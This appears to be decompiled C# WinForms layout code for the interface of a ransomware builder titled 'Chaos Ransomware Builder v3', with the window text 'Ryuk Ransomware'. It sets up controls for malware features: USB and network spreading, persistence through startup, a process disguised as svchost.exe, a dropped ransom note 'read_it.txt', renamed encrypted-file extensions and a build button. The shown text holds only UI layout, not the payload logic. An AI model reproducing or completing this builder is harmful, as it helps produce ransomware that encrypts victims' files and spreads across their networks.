		checkBox2 = new CheckBox();
		spreadNameText = new TextBox();
		checkBox1 = new CheckBox();
		textBox2 = new TextBox();
		usbSpreadCheckBox = new CheckBox();
		shapedButton4 = new ShapedButton();
		shapedButton3 = new ShapedButton();
		RightBottomPanel_2 = new Panel();
		LeftBottomPanel_2 = new Panel();
		RightTopPanel_1 = new Panel();
		RightTopPanel_2 = new Panel();
		textBox1 = new TextBox();
		saveFileDialog1 = new SaveFileDialog();
		openFileDialog1 = new OpenFileDialog();
		((Control)TopPanel).SuspendLayout();
		((Control)panel2).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)RightPanel).set_Anchor((AnchorStyles)11);
		((Control)RightPanel).set_BackColor(Color.Black);
		((Control)RightPanel).set_Cursor(Cursors.get_SizeWE());
		((Control)RightPanel).set_Location(new Point(879, 22));
		((Control)RightPanel).set_Name("RightPanel");
		((Control)RightPanel).set_Size(new Size(2, 475));
		((Control)RightPanel).set_TabIndex(1);
		((Control)RightPanel).add_MouseDown(new MouseEventHandler(RightPanel_MouseDown));
		((Control)RightPanel).add_MouseMove(new MouseEventHandler(RightPanel_MouseMove));
		((Control)RightPanel).add_MouseUp(new MouseEventHandler(RightPanel_MouseUp));
		((Control)TopPanel).set_Anchor((AnchorStyles)13);
		((Control)TopPanel).set_BackColor(Color.FromArgb(30, 30, 30));
		((Control)TopPanel).get_Controls().Add((Control)(object)_MinButton);
		((Control)TopPanel).get_Controls().Add((Control)(object)_MaxButton);
		((Control)TopPanel).get_Controls().Add((Control)(object)WindowTextLabel);
		((Control)TopPanel).get_Controls().Add((Control)(object)_CloseButton);
		((Control)TopPanel).set_Location(new Point(0, 0));
		((Control)TopPanel).set_Name("TopPanel");
		((Control)TopPanel).set_Size(new Size(844, 74));
		((Control)TopPanel).set_TabIndex(4);
		((Control)TopPanel).add_MouseDown(new MouseEventHandler(TopPanel_MouseDown));
		((Control)TopPanel).add_MouseMove(new MouseEventHandler(TopPanel_MouseMove));
		((Control)TopPanel).add_MouseUp(new MouseEventHandler(TopPanel_MouseUp));
		((Control)_MinButton).set_Anchor((AnchorStyles)9);
		_MinButton.BZBackColor = Color.FromArgb(30, 30, 30);
		_MinButton.DisplayText = "_";
		((ButtonBase)_MinButton).set_FlatStyle((FlatStyle)0);
		((Control)_MinButton).set_Font(new Font("Microsoft Sans Serif", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)_MinButton).set_ForeColor(Color.White);
		((Control)_MinButton).set_Location(new Point(749, 8));
		_MinButton.MouseClickColor1 = Color.FromArgb(60, 60, 160);
		_MinButton.MouseHoverColor = Color.FromArgb(50, 50, 50);
		((Control)_MinButton).set_Name("_MinButton");
		((Control)_MinButton).set_Size(new Size(31, 24));
		((Control)_MinButton).set_TabIndex(4);
		((Control)_MinButton).set_Text("_");
		_MinButton.TextLocation_X = 6;
		_MinButton.TextLocation_Y = -20;
		((ButtonBase)_MinButton).set_UseVisualStyleBackColor(true);
		((Control)_MinButton).add_Click((EventHandler)_MinButton_Click);
		((Control)_MaxButton).set_Anchor((AnchorStyles)9);
		_MaxButton.BZBackColor = Color.FromArgb(30, 30, 30);
		_MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
		_MaxButton.DisplayText = "_";
		((ButtonBase)_MaxButton).set_FlatStyle((FlatStyle)0);
		((Control)_MaxButton).set_ForeColor(Color.White);
		((Control)_MaxButton).set_Location(new Point(780, 8));
		_MaxButton.MouseClickColor1 = Color.FromArgb(60, 60, 160);
		_MaxButton.MouseHoverColor = Color.FromArgb(50, 50, 50);
		((Control)_MaxButton).set_Name("_MaxButton");
		((Control)_MaxButton).set_Size(new Size(31, 24));
		((Control)_MaxButton).set_TabIndex(2);
		((Control)_MaxButton).set_Text("minMaxButton1");
		_MaxButton.TextLocation_X = 8;
		_MaxButton.TextLocation_Y = 6;
		((ButtonBase)_MaxButton).set_UseVisualStyleBackColor(true);
		((Control)_MaxButton).add_Click((EventHandler)_MaxButton_Click);
		((Control)WindowTextLabel).set_AutoSize(true);
		((Control)WindowTextLabel).set_Font(new Font("Microsoft Sans Serif", 26.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)WindowTextLabel).set_ForeColor(Color.White);
		((Control)WindowTextLabel).set_Location(new Point(8, 22));
		((Control)WindowTextLabel).set_Name("WindowTextLabel");
		((Control)WindowTextLabel).set_Size(new Size(494, 39));
		((Control)WindowTextLabel).set_TabIndex(1);
		((Control)WindowTextLabel).set_Text("Chaos Ransomware Builder v3");
		((Control)WindowTextLabel).add_MouseDown(new MouseEventHandler(WindowTextLabel_MouseDown));
		((Control)WindowTextLabel).add_MouseMove(new MouseEventHandler(WindowTextLabel_MouseMove));
		((Control)WindowTextLabel).add_MouseUp(new MouseEventHandler(WindowTextLabel_MouseUp));
		((Control)_CloseButton).set_Anchor((AnchorStyles)9);
		_CloseButton.BZBackColor = Color.FromArgb(30, 30, 30);
		_CloseButton.DisplayText = "X";
		((ButtonBase)_CloseButton).set_FlatStyle((FlatStyle)0);
		((Control)_CloseButton).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)_CloseButton).set_ForeColor(Color.White);
		((Control)_CloseButton).set_Location(new Point(811, 8));
		_CloseButton.MouseClickColor1 = Color.FromArgb(60, 60, 160);
		_CloseButton.MouseHoverColor = Color.FromArgb(50, 50, 50);
		((Control)_CloseButton).set_Name("_CloseButton");
		((Control)_CloseButton).set_Size(new Size(31, 24));
		((Control)_CloseButton).set_TabIndex(0);
		((Control)_CloseButton).set_Text("X");
		_CloseButton.TextLocation_X = 6;
		_CloseButton.TextLocation_Y = 1;
		((ButtonBase)_CloseButton).set_UseVisualStyleBackColor(true);
		((Control)_CloseButton).add_Click((EventHandler)_CloseButton_Click);
		((Control)RightBottomPanel_1).set_Anchor((AnchorStyles)10);
		((Control)RightBottomPanel_1).set_BackColor(Color.Black);
		((Control)RightBottomPanel_1).set_Cursor(Cursors.get_SizeNWSE());
		((Control)RightBottomPanel_1).set_Location(new Point(861, 516));
		((Control)RightBottomPanel_1).set_Name("RightBottomPanel_1");
		((Control)RightBottomPanel_1).set_Size(new Size(19, 2));
		((Control)RightBottomPanel_1).set_TabIndex(5);
		((Control)RightBottomPanel_1).add_MouseDown(new MouseEventHandler(RightBottomPanel_1_MouseDown));
		((Control)RightBottomPanel_1).add_MouseMove(new MouseEventHandler(RightBottomPanel_1_MouseMove));
		((Control)RightBottomPanel_1).add_MouseUp(new MouseEventHandler(RightBottomPanel_1_MouseUp));
		((Control)panel2).set_BackColor(Color.FromArgb(30, 30, 30));
		((Control)panel2).get_Controls().Add((Control)(object)label1);
		((Control)panel2).get_Controls().Add((Control)(object)droppedMessageTextbox);
		((Control)panel2).get_Controls().Add((Control)(object)shapedButton1);
		((Control)panel2).get_Controls().Add((Control)(object)sleepCheckBox);
		((Control)panel2).get_Controls().Add((Control)(object)SleepTextBox);
		((Control)panel2).get_Controls().Add((Control)(object)selectIconLabel);
		((Control)panel2).get_Controls().Add((Control)(object)pictureBox1);
		((Control)panel2).get_Controls().Add((Control)(object)startupcheckBox3);
		((Control)panel2).get_Controls().Add((Control)(object)textBox4);
		((Control)panel2).get_Controls().Add((Control)(object)checkBox2);
		((Control)panel2).get_Controls().Add((Control)(object)spreadNameText);
		((Control)panel2).get_Controls().Add((Control)(object)checkBox1);
		((Control)panel2).get_Controls().Add((Control)(object)textBox2);
		((Control)panel2).get_Controls().Add((Control)(object)usbSpreadCheckBox);
		((Control)panel2).get_Controls().Add((Control)(object)shapedButton4);
		((Control)panel2).get_Controls().Add((Control)(object)shapedButton3);
		((Control)panel2).set_Dock((DockStyle)2);
		((Control)panel2).set_ForeColor(SystemColors.Control);
		((Control)panel2).set_Location(new Point(0, 400));
		((Control)panel2).set_Name("panel2");
		((Control)panel2).set_Size(new Size(847, 144));
		((Control)panel2).set_TabIndex(8);
		((Control)panel2).add_Paint(new PaintEventHandler(panel2_Paint));
		((Control)label1).set_Anchor((AnchorStyles)9);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_Location(new Point(405, 11));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(115, 15));
		((Control)label1).set_TabIndex(26);
		((Control)label1).set_Text("Dropped File Name");
		((Control)droppedMessageTextbox).set_Anchor((AnchorStyles)9);
		((Control)droppedMessageTextbox).set_BackColor(Color.FromArgb(30, 30, 30));
		((Control)droppedMessageTextbox).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)droppedMessageTextbox).set_ForeColor(SystemColors.Window);
		((Control)droppedMessageTextbox).set_Location(new Point(541, 8));
		((Control)droppedMessageTextbox).set_Name("droppedMessageTextbox");
		((Control)droppedMessageTextbox).set_Size(new Size(132, 22));
		((Control)droppedMessageTextbox).set_TabIndex(25);
		((Control)droppedMessageTextbox).set_Text("read_it.txt");
		droppedMessageTextbox.set_TextAlign((HorizontalAlignment)2);
		((Control)shapedButton1).set_BackColor(Color.Transparent);
		shapedButton1.BorderColor = Color.Transparent;
		shapedButton1.BorderWidth = 2;
		shapedButton1.ButtonShape = ShapedButton.ButtonsShapes.RoundRect;
		shapedButton1.ButtonText = "Advanced Options";
		((Control)shapedButton1).set_Cursor(Cursors.get_Hand());
		shapedButton1.EndColor = Color.FromArgb(30, 30, 30);
		((ButtonBase)shapedButton1).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)shapedButton1).get_FlatAppearance().set_MouseDownBackColor(Color.Transparent);
		((ButtonBase)shapedButton1).get_FlatAppearance().set_MouseOverBackColor(Color.Transparent);
		((ButtonBase)shapedButton1).set_FlatStyle((FlatStyle)0);
		((Control)shapedButton1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)shapedButton1).set_ForeColor(Color.White);
		shapedButton1.GradientAngle = 80;
		((Control)shapedButton1).set_Location(new Point(132, 86));
		shapedButton1.MouseClickColor1 = Color.Black;
		shapedButton1.MouseClickColor2 = Color.Black;
		shapedButton1.MouseHoverColor1 = Color.FromArgb(80, 80, 80);
		shapedButton1.MouseHoverColor2 = Color.FromArgb(80, 80, 80);
		((Control)shapedButton1).set_Name("shapedButton1");
		shapedButton1.ShowButtontext = true;
		((Control)shapedButton1).set_Size(new Size(192, 55));
		shapedButton1.StartColor = Color.FromArgb(30, 30, 30);
		((Control)shapedButton1).set_TabIndex(23);
		shapedButton1.TextLocation_X = 30;
		shapedButton1.TextLocation_Y = 19;
		shapedButton1.Transparent1 = 200;
		shapedButton1.Transparent2 = 200;
		((ButtonBase)shapedButton1).set_UseVisualStyleBackColor(false);
		((Control)shapedButton1).add_Click((EventHandler)shapedButton1_Click);
		((Control)sleepCheckBox).set_Anchor((AnchorStyles)9);
		((Control)sleepCheckBox).set_AutoSize(true);
		((Control)sleepCheckBox).set_Cursor(Cursors.get_Hand());
		((Control)sleepCheckBox).set_Location(new Point(429, 77));
		((Control)sleepCheckBox).set_Name("sleepCheckBox");
		((Control)sleepCheckBox).set_Size(new Size(91, 17));
		((Control)sleepCheckBox).set_TabIndex(22);
		((Control)sleepCheckBox).set_Text("Delay second");
		((ButtonBase)sleepCheckBox).set_UseVisualStyleBackColor(true);
		sleepCheckBox.add_CheckedChanged((EventHandler)checkBox3_CheckedChanged);
		((Control)SleepTextBox).set_Anchor((AnchorStyles)9);
		((Control)SleepTextBox).set_BackColor(Color.FromArgb(30, 30, 30));
		((Control)SleepTextBox).set_Enabled(false);
		((Control)SleepTextBox).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)SleepTextBox).set_ForeColor(SystemColors.Window);
		((Control)SleepTextBox).set_Location(new Point(429, 110));
		((Control)SleepTextBox).set_Name("SleepTextBox");
		((Control)SleepTextBox).set_Size(new Size(91, 22));
		((Control)SleepTextBox).set_TabIndex(21);
		((Control)SleepTextBox).set_Text("10");
		SleepTextBox.set_TextAlign((HorizontalAlignment)2);
		((Control)SleepTextBox).add_KeyPress(new KeyPressEventHandler(SleepTextBox_KeyPress_1));
		((Control)selectIconLabel).set_Anchor((AnchorStyles)9);
		((Control)selectIconLabel).set_AutoSize(true);
		((Control)selectIconLabel).set_Cursor(Cursors.get_Hand());
		((Control)selectIconLabel).set_Location(new Point(579, 97));
		((Control)selectIconLabel).set_Name("selectIconLabel");
		((Control)selectIconLabel).set_Size(new Size(61, 13));
		((Control)selectIconLabel).set_TabIndex(20);
		((Control)selectIconLabel).set_Text("Select Icon");
		((Control)selectIconLabel).add_Click((EventHandler)selectIconLabel_Click);
		((Control)pictureBox1).set_Anchor((AnchorStyles)9);
		pictureBox1.set_BorderStyle((BorderStyle)1);
		((Control)pictureBox1).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox1).set_Location(new Point(565, 72));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(89, 69));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)3);
		pictureBox1.set_TabIndex(18);
		pictureBox1.set_TabStop(false);
		((Control)pictureBox1).add_Click((EventHandler)pictureBox1_Click);
		((Control)startupcheckBox3).set_AutoSize(true);
		startupcheckBox3.set_Checked(true);
		startupcheckBox3.set_CheckState((CheckState)1);
		((Control)startupcheckBox3).set_Cursor(Cursors.get_Hand());
		((Control)startupcheckBox3).set_Location(new Point(32, 93));
		((Control)startupcheckBox3).set_Name("startupcheckBox3");
		((Control)startupcheckBox3).set_Size(new Size(92, 17));
		((Control)startupcheckBox3).set_TabIndex(15);
		((Control)startupcheckBox3).set_Text("Add to startup");
		((ButtonBase)startupcheckBox3).set_UseVisualStyleBackColor(true);
		((Control)textBox4).set_Anchor((AnchorStyles)9);
		((Control)textBox4).set_BackColor(Color.FromArgb(30, 30, 30));
		((Control)textBox4).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox4).set_ForeColor(SystemColors.Window);
		((Control)textBox4).set_Location(new Point(541, 44));
		((Control)textBox4).set_Name("textBox4");
		((Control)textBox4).set_Size(new Size(132, 22));
		((Control)textBox4).set_TabIndex(14);
		((Control)textBox4).set_Text("svchost.exe");
		textBox4.set_TextAlign((HorizontalAlignment)2);
		((Control)checkBox2).set_Anchor((AnchorStyles)9);
		((Control)checkBox2).set_AutoSize(true);
		checkBox2.set_Checked(true);
		checkBox2.set_CheckState((CheckState)1);
		((Control)checkBox2).set_Cursor(Cursors.get_Hand());
		((Control)checkBox2).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)checkBox2).set_Location(new Point(429, 48));
		((Control)checkBox2).set_Name("checkBox2");
		((Control)checkBox2).set_Size(new Size(101, 17));
		((Control)checkBox2).set_TabIndex(13);
		((Control)checkBox2).set_Text("Proccess Name");
		((ButtonBase)checkBox2).set_UseVisualStyleBackColor(true);
		checkBox2.add_CheckedChanged((EventHandler)checkBox2_CheckedChanged);
		((Control)spreadNameText).set_BackColor(Color.FromArgb(30, 30, 30));
		((Control)spreadNameText).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)spreadNameText).set_ForeColor(SystemColors.Window);
		((Control)spreadNameText).set_Location(new Point(181, 48));
		((Control)spreadNameText).set_Name("spreadNameText");
		((Control)spreadNameText).set_Size(new Size(143, 22));
		((Control)spreadNameText).set_TabIndex(12);
		((Control)spreadNameText).set_Text("surprise");
		spreadNameText.set_TextAlign((HorizontalAlignment)2);
		((Control)checkBox1).set_AutoSize(true);
		checkBox1.set_Checked(true);
		checkBox1.set_CheckState((CheckState)1);
		((Control)checkBox1).set_Cursor(Cursors.get_Hand());
		((Control)checkBox1).set_Location(new Point(32, 10));
		((Control)checkBox1).set_Name("checkBox1");
		((Control)checkBox1).set_Size(new Size(143, 17));
		((Control)checkBox1).set_TabIndex(11);
		((Control)checkBox1).set_Text("Randomize file extension");
		((ButtonBase)checkBox1).set_UseVisualStyleBackColor(true);
		checkBox1.add_CheckedChanged((EventHandler)checkBox1_CheckedChanged);
		((Control)textBox2).set_BackColor(Color.FromArgb(30, 30, 30));
		((Control)textBox2).set_Enabled(false);
		((Control)textBox2).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox2).set_ForeColor(SystemColors.Window);
		((Control)textBox2).set_Location(new Point(181, 8));
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(143, 22));
		((Control)textBox2).set_TabIndex(10);
		((Control)textBox2).set_Text("encrypted");
		textBox2.set_TextAlign((HorizontalAlignment)2);
		((Control)usbSpreadCheckBox).set_AutoSize(true);
		usbSpreadCheckBox.set_Checked(true);
		usbSpreadCheckBox.set_CheckState((CheckState)1);
		((Control)usbSpreadCheckBox).set_Cursor(Cursors.get_Hand());
		((Control)usbSpreadCheckBox).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)usbSpreadCheckBox).set_Location(new Point(32, 52));
		((Control)usbSpreadCheckBox).set_Name("usbSpreadCheckBox");
		((Control)usbSpreadCheckBox).set_Size(new Size(142, 17));
		((Control)usbSpreadCheckBox).set_TabIndex(9);
		((Control)usbSpreadCheckBox).set_Text("Usb and network spread");
		((ButtonBase)usbSpreadCheckBox).set_UseVisualStyleBackColor(true);
		usbSpreadCheckBox.add_CheckedChanged((EventHandler)usbSpreadCheckBox_CheckedChanged);
		((Control)shapedButton4).set_Anchor((AnchorStyles)9);
		((Control)shapedButton4).set_BackColor(Color.Transparent);
		shapedButton4.BorderColor = Color.Transparent;
		shapedButton4.BorderWidth = 2;
		shapedButton4.ButtonShape = ShapedButton.ButtonsShapes.RoundRect;
		shapedButton4.ButtonText = "Build ";
		((Control)shapedButton4).set_Cursor(Cursors.get_Hand());
		shapedButton4.EndColor = Color.FromArgb(30, 30, 30);
		((ButtonBase)shapedButton4).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)shapedButton4).get_FlatAppearance().set_MouseDownBackColor(Color.Transparent);
		((ButtonBase)shapedButton4).get_FlatAppearance().set_MouseOverBackColor(Color.Transparent);
		((ButtonBase)shapedButton4).set_FlatStyle((FlatStyle)0);
		((Control)shapedButton4).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)shapedButton4).set_ForeColor(Color.White);
		shapedButton4.GradientAngle = 90;
		((Control)shapedButton4).set_Location(new Point(706, 72));
		shapedButton4.MouseClickColor1 = Color.Black;
		shapedButton4.MouseClickColor2 = Color.Black;
		shapedButton4.MouseHoverColor1 = Color.FromArgb(80, 80, 80);
		shapedButton4.MouseHoverColor2 = Color.FromArgb(80, 80, 80);
		((Control)shapedButton4).set_Name("shapedButton4");
		shapedButton4.ShowButtontext = true;
		((Control)shapedButton4).set_Size(new Size(136, 55));
		shapedButton4.StartColor = Color.FromArgb(30, 30, 30);
		((Control)shapedButton4).set_TabIndex(8);
		shapedButton4.TextLocation_X = 46;
		shapedButton4.TextLocation_Y = 18;
		shapedButton4.Transparent1 = 250;
		shapedButton4.Transparent2 = 250;
		((ButtonBase)shapedButton4).set_UseVisualStyleBackColor(false);
		((Control)shapedButton4).add_Click((EventHandler)shapedButton4_Click);
		((Control)shapedButton3).set_Anchor((AnchorStyles)9);
		((Control)shapedButton3).set_BackColor(Color.Transparent);
		shapedButton3.BorderColor = Color.Transparent;
		shapedButton3.BorderWidth = 2;
		shapedButton3.ButtonShape = ShapedButton.ButtonsShapes.RoundRect;
		shapedButton3.ButtonText = "About";
		((Control)shapedButton3).set_Cursor(Cursors.get_Hand());
		shapedButton3.EndColor = Color.FromArgb(30, 30, 30);
		((ButtonBase)shapedButton3).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)shapedButton3).get_FlatAppearance().set_MouseDownBackColor(Color.Transparent);
		((ButtonBase)shapedButton3).get_FlatAppearance().set_MouseOverBackColor(Color.Transparent);
		((ButtonBase)shapedButton3).set_FlatStyle((FlatStyle)0);
		((Control)shapedButton3).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)shapedButton3).set_ForeColor(Color.White);
		shapedButton3.GradientAngle = 90;
		((Control)shapedButton3).set_Location(new Point(708, 11));
		shapedButton3.MouseClickColor1 = Color.Black;
		shapedButton3.MouseClickColor2 = Color.Black;
		shapedButton3.MouseHoverColor1 = Color.FromArgb(80, 80, 80);
		shapedButton3.MouseHoverColor2 = Color.FromArgb(80, 80, 80);
		((Control)shapedButton3).set_Name("shapedButton3");
		shapedButton3.ShowButtontext = true;
		((Control)shapedButton3).set_Size(new Size(136, 55));
		shapedButton3.StartColor = Color.FromArgb(30, 30, 30);
		((Control)shapedButton3).set_TabIndex(7);
		shapedButton3.TextLocation_X = 45;
		shapedButton3.TextLocation_Y = 18;
		shapedButton3.Transparent1 = 250;
		shapedButton3.Transparent2 = 250;
		((ButtonBase)shapedButton3).set_UseVisualStyleBackColor(false);
		((Control)shapedButton3).add_Click((EventHandler)shapedButton3_Click);
		((Control)RightBottomPanel_2).set_Anchor((AnchorStyles)10);
		((Control)RightBottomPanel_2).set_BackColor(Color.Black);
		((Control)RightBottomPanel_2).set_Cursor(Cursors.get_SizeNWSE());
		((Control)RightBottomPanel_2).set_Location(new Point(879, 497));
		((Control)RightBottomPanel_2).set_Name("RightBottomPanel_2");
		((Control)RightBottomPanel_2).set_Size(new Size(2, 19));
		((Control)RightBottomPanel_2).set_TabIndex(9);
		((Control)RightBottomPanel_2).add_MouseDown(new MouseEventHandler(RightBottomPanel_2_MouseDown));
		((Control)RightBottomPanel_2).add_MouseMove(new MouseEventHandler(RightBottomPanel_2_MouseMove));
		((Control)RightBottomPanel_2).add_MouseUp(new MouseEventHandler(RightBottomPanel_2_MouseUp));
		((Control)LeftBottomPanel_2).set_Anchor((AnchorStyles)6);
		((Control)LeftBottomPanel_2).set_BackColor(Color.Black);
		((Control)LeftBottomPanel_2).set_Cursor(Cursors.get_SizeNESW());
		((Control)LeftBottomPanel_2).set_Location(new Point(0, 498));
		((Control)LeftBottomPanel_2).set_Name("LeftBottomPanel_2");
		((Control)LeftBottomPanel_2).set_Size(new Size(2, 19));
		((Control)LeftBottomPanel_2).set_TabIndex(11);
		((Control)LeftBottomPanel_2).add_MouseDown(new MouseEventHandler(LeftBottomPanel_2_MouseDown));
		((Control)LeftBottomPanel_2).add_MouseMove(new MouseEventHandler(LeftBottomPanel_2_MouseMove));
		((Control)LeftBottomPanel_2).add_MouseUp(new MouseEventHandler(LeftBottomPanel_2_MouseUp));
		((Control)RightTopPanel_1).set_Anchor((AnchorStyles)9);
		((Control)RightTopPanel_1).set_BackColor(Color.Black);
		((Control)RightTopPanel_1).set_Cursor(Cursors.get_SizeNESW());
		((Control)RightTopPanel_1).set_Location(new Point(879, 2));
		((Control)RightTopPanel_1).set_Name("RightTopPanel_1");
		((Control)RightTopPanel_1).set_Size(new Size(2, 20));
		((Control)RightTopPanel_1).set_TabIndex(12);
		((Control)RightTopPanel_1).add_MouseDown(new MouseEventHandler(RightTopPanel_1_MouseDown));
		((Control)RightTopPanel_1).add_MouseMove(new MouseEventHandler(RightTopPanel_1_MouseMove));
		((Control)RightTopPanel_1).add_MouseUp(new MouseEventHandler(RightTopPanel_1_MouseUp));
		((Control)RightTopPanel_2).set_Anchor((AnchorStyles)9);
		((Control)RightTopPanel_2).set_BackColor(Color.Black);
		((Control)RightTopPanel_2).set_Cursor(Cursors.get_SizeNESW());
		((Control)RightTopPanel_2).set_Location(new Point(861, 0));
		((Control)RightTopPanel_2).set_Name("RightTopPanel_2");
		((Control)RightTopPanel_2).set_Size(new Size(20, 2));
		((Control)RightTopPanel_2).set_TabIndex(13);
		((Control)RightTopPanel_2).add_MouseDown(new MouseEventHandler(RightTopPanel_2_MouseDown));
		((Control)RightTopPanel_2).add_MouseMove(new MouseEventHandler(RightTopPanel_2_MouseMove));
		((Control)RightTopPanel_2).add_MouseUp(new MouseEventHandler(RightTopPanel_2_MouseUp));
		((Control)textBox1).set_Anchor((AnchorStyles)15);
		((Control)textBox1).set_BackColor(Color.FromArgb(30, 30, 30));
		((TextBoxBase)textBox1).set_BorderStyle((BorderStyle)0);
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_ForeColor(SystemColors.Window);
		((Control)textBox1).set_Location(new Point(12, 80));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name("textBox1");
		textBox1.set_ScrollBars((ScrollBars)2);
		((Control)textBox1).set_Size(new Size(830, 314));
		((Control)textBox1).set_TabIndex(18);
		((Control)textBox1).set_Text(componentResourceManager.GetString("textBox1.Text"));
		((TextBoxBase)textBox1).add_MouseClick(new MouseEventHandler(textBox1_MouseClick));
		((Control)textBox1).add_TextChanged((EventHandler)textBox1_TextChanged);
		((FileDialog)saveFileDialog1).add_FileOk((CancelEventHandler)saveFileDialog1_FileOk);
		((FileDialog)openFileDialog1).set_FileName("openFileDialog1");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((ScrollableControl)this).set_AutoScroll(true);
		((Control)this).set_BackColor(Color.FromArgb(30, 30, 30));
		((Form)this).set_ClientSize(new Size(847, 544));
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)RightTopPanel_2);
		((Control)this).get_Controls().Add((Control)(object)RightTopPanel_1);
		((Control)this).get_Controls().Add((Control)(object)LeftBottomPanel_2);
		((Control)this).get_Controls().Add((Control)(object)RightBottomPanel_2);
		((Control)this).get_Controls().Add((Control)(object)RightBottomPanel_1);
		((Control)this).get_Controls().Add((Control)(object)RightPanel);
		((Control)this).get_Controls().Add((Control)(object)TopPanel);
		((Control)this).get_Controls().Add((Control)(object)panel2);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_MinimumSize(new Size(847, 544));
		((Control)this).set_Name("BlackForm");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Ryuk Ransomware");
		((Form)this).add_Load((EventHandler)BlackForm_Load);
		((Control)TopPanel).ResumeLayout(false);
		((Control)TopPanel).PerformLayout();
		((Control)panel2).ResumeLayout(false);
		((Control)panel2).PerformLayout();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
